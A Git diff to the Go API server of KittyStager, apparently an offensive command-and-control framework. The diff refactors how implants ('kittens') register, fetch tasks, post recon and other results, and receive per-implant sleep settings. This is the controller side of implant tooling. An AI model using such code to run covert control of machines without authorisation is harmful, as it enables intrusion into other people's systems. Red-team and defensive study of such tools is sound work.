@@ -2,16 +2,14 @@ package api
 
 import (
 	"KittyStager/internal/config"
+	crypto2 "KittyStager/internal/crypto"
 	"KittyStager/internal/kitten"
 	"KittyStager/internal/task"
-	ps2 "KittyStager/internal/task/ps"
 	"KittyStager/internal/task/recon"
-	"KittyStager/pkg/crypto"
 	"fmt"
 	"github.com/gin-gonic/gin"
 	"golang.org/x/sync/errgroup"
 	"io"
-	"log"
 	"os"
 	"strconv"
 	"time"
@@ -20,13 +18,14 @@ import (
 var (
 	Kittens map[string]*kitten.Kitten
 	conf    *config.Config
+	tasks   []*task.Task
 	g       errgroup.Group
-	chacha  *crypto.ChaCha20
+	chacha  *crypto2.ChaCha20
 )
 
 func init() {
 	Kittens = make(map[string]*kitten.Kitten)
-	chacha = crypto.NewChaCha20()
+	chacha = crypto2.NewChaCha20()
 }
 
 func Api(config *config.Config) error {
@@ -54,7 +53,7 @@ func Api(config *config.Config) error {
 	//gin.SetMode(gin.ReleaseMode)
 	//front := gin.Default()
 	front.GET(fmt.Sprintf("%s/:name", conf.GetGetEndpoint()), frontGetTask)
-	front.POST(fmt.Sprintf("%s/:name", conf.GetPostEndpoint()), frontPostTask)
+	front.POST(fmt.Sprintf("%s/:name", conf.GetPostEndpoint()), frontPostResult)
 	front.POST(conf.GetOpaqueEndpoint(), frontPostReg)
 	addr := fmt.Sprintf("%s:%d", conf.GetHost(), conf.GetPort())
 
@@ -71,6 +70,8 @@ func Api(config *config.Config) error {
 	g.Go(func() error {
 		fmt.Printf("[*] Listening on %s\n", addr)
 		return front.Run(addr)
+		//return autotls.Run(front, "google.com")
+		//return front.RunTLS(addr)
 	})
 	//backend
 	g.Go(func() error {
@@ -78,8 +79,8 @@ func Api(config *config.Config) error {
 		return back.Run(localAddr)
 	})
 
-	if err := g.Wait(); err != nil {
-		log.Fatal(err)
+	if err = g.Wait(); err != nil {
+		return err
 	}
 	return nil
 }
@@ -89,12 +90,11 @@ func Api(config *config.Config) error {
 // ------------------------
 func frontGetTask(c *gin.Context) {
 	name := c.Param("name")
-	tasks := Kittens[name].Tasks
+	tasks = Kittens[name].Tasks
 	//take the last task
 	var t *task.Task
+	//avoid out of bound
 	if len(tasks) == 1 {
-		sleep := strconv.Itoa(conf.GetSleep())
-		tasks[0].SetPayload([]byte(sleep))
 		t = tasks[0]
 	} else {
 		t = tasks[len(tasks)-1]
@@ -118,7 +118,7 @@ func frontGetTask(c *gin.Context) {
 	Kittens[name].SetLastSeen(lastSeen)
 }
 
-func frontPostTask(c *gin.Context) {
+func frontPostResult(c *gin.Context) {
 	name := c.Param("name")
 	t := task.NewTask("", nil)
 	data, err := io.ReadAll(c.Request.Body)
@@ -141,12 +141,9 @@ func frontPostTask(c *gin.Context) {
 			return
 		}
 		Kittens[name].SetRecon(r)
-	case "ps":
-		ps := ps2.NewProcessList(nil)
-		err = ps.UnmarshallTask(t.Payload)
-		if err != nil {
-			return
-		}
+	default:
+		//tasks = append(tasks, t)
+		Kittens[name].SetResult(t)
 	}
 }
 
@@ -159,7 +156,7 @@ func frontPostReg(c *gin.Context) {
 	if err != nil {
 		return
 	}
-	dataToReturn, name, key := crypto.HandleAuth(data)
+	dataToReturn, name, key := crypto2.HandleAuth(data)
 	_, err = c.Writer.Write(dataToReturn)
 	if err != nil {
 		return
@@ -201,7 +198,7 @@ func backGetLogs(c *gin.Context) {
 
 func backGetTasks(c *gin.Context) {
 	name := c.Param("name")
-	t := Kittens[name].Tasks
+	t := Kittens[name].GetTasks()
 	c.IndentedJSON(200, t)
 }
 
@@ -215,17 +212,23 @@ func backCreateTask(c *gin.Context) {
 		return
 	}
 	if t.Tag == "sleep" {
-		t, err := strconv.Atoi(string(t.Payload))
+		s, err := strconv.Atoi(string(t.Payload))
 		if err != nil {
 			return
 		}
-		conf.SetSleep(t)
+		Kittens[name].SetSleep(s)
+		Kittens[name].Tasks[0].SetPayload(t.Payload)
 	}
 	Kittens[name].SetTask(&t)
 }
 
 func backGetResult(c *gin.Context) {
 	name := c.Param("name")
-	t := Kittens[name].Tasks
+	t := Kittens[name].GetResult()
+	_, err := t.MarshallTask()
+	if err != nil {
+		return
+	}
 	c.IndentedJSON(200, t)
+	Kittens[name].SetResult(nil)
 }
